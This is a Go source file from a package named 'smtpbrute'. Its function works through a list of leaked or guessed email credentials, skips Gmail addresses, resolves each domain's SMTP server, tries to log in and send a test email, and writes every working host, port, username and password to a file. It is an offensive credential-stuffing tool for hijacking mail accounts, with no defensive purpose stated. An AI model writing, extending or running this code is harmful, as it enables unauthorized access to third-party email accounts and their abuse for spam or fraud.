package smtpbrute

import (
	"fmt"
	"os"
	"sync"

	"github.com/fatih/color"
)

func ProcessCredentials(wordList <-chan []string, file *os.File, testEmail string, mutex *sync.Mutex, wg *sync.WaitGroup, totalChecks *int) {
	defer wg.Done()
	wordListChunks := <-wordList
	green := color.New(color.FgGreen).PrintfFunc()
	blue := color.New(color.FgBlue).PrintfFunc()
	red := color.New(color.FgRed).PrintfFunc()
	for _, creds := range wordListChunks {
		splitedCreds, err := FilterGmailCreds(creds)
		if err == nil {
			smtpCreds, err := LookupDomain(splitedCreds)
			if err == nil {
				results, err := ConnectSMTP(smtpCreds, testEmail)
				mutex.Lock()
				if err == nil {
					*totalChecks++
					blue("%d: -> ", *totalChecks)
					host, port, username, password := results[2], results[3], results[0], results[1]
					green("%s\t%s\t%s\t%s\n", host, port, username, password)
					finalCreds := fmt.Sprintf("%s,%s,%s,%s\n", host, port, username, password)
					file.WriteString(finalCreds)
				} else {
					*totalChecks++
					blue("%d: -> ", *totalChecks)
					red("%s\n", err)
				}
				mutex.Unlock()
			}

		}
	}
}
